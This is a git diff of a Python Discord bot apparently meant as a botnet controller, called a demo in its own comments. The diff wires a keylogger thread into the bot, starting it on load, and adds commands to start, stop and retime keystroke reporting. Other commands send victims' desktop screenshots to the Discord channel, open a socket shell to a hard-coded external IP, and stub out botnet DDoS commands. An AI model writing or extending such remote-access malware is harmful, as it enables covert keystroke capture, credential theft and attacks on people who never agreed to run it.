@@ -10,6 +10,7 @@ test so probably wont end up doing that unless im interested in crashing my own 
 #Written and designed by Stone Preheim
 from discord.ext import commands
 from Client import Client
+from Keylogger import Keylogger
 import sys
 import discord
 import getpass
@@ -28,6 +29,8 @@ activated = False
 closeDDOS = True
 closeLogger = True
 controllerVersion = "V1.1"
+keyListener = Keylogger(15, 'discord', botID) #creating keylogger object to hold reference too
+loggerThread = threading.Thread(target=keyListener.mainLoop, args=()).start() #need reference to logging thread so it doesnt keep making more. not doing this for socket since i could want more than one shell at a time.
 
 #May not implement this in the end as there is no reasonable reason to do this for demo purposes.
 #Might do it anyways because it'd be cool.
@@ -96,16 +99,25 @@ async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
 #command for starting keylogger to report new keys every 60 seconds:
 @bot.command("startlog")
 async def startlog(ctx):
-    global activated
+    global activated, keyListener
     if activated:
+        keyListener.startReading()
         await ctx.send(f"{botID} has started listening...")
 
 #command to stop keylogging
 @bot.command("stoplog")
 async def stoplog(ctx):
+    global activated, keyListener
+    if activated:
+        keyListener.stopReading()# Much more graceful than killing thread.
+        await ctx.send(f"{botID} has stopped listening...")
+
+@bot.command("setint")
+async def setint(ctx, interval = 5):
     global activated
     if activated:
-        await ctx.send(f"{botID} has stopped listening...")
+        keyListener.changeInterval(int(interval))
+        await ctx.send(f"{botID} new listening interval is {interval}...")
 
 #screenshots user desktop
 @bot.command("ss")
@@ -126,12 +138,12 @@ async def ss(ctx):
         cv2.imwrite('secretsauce.png', pic)
         await ctx.send(file=discord.File('secretsauce.png'))
 
-#command to start entire botnet ddos at target
+#command to start entire botnet ddos at target, might implement this with scapy
 @bot.command("firelaser")
 async def fireLaser(ctx, TARGET, TPORT):
     await ctx.send(f"{botID} has started attack on {TARGET}:{TPORT}")
 
-#command to stop entire botnet ddos at target
+#command to stop entire botnet ddos at target, might implement this with scapy
 @bot.command("ceasefire")
 async def ceaseFire(ctx):
     await ctx.send(f"{botID} has stopped attack")
@@ -143,7 +155,6 @@ async def vanish(ctx):
 
 def start():
     bot.run(TOKEN)
-
 
 if __name__ == '__main__':
     try:
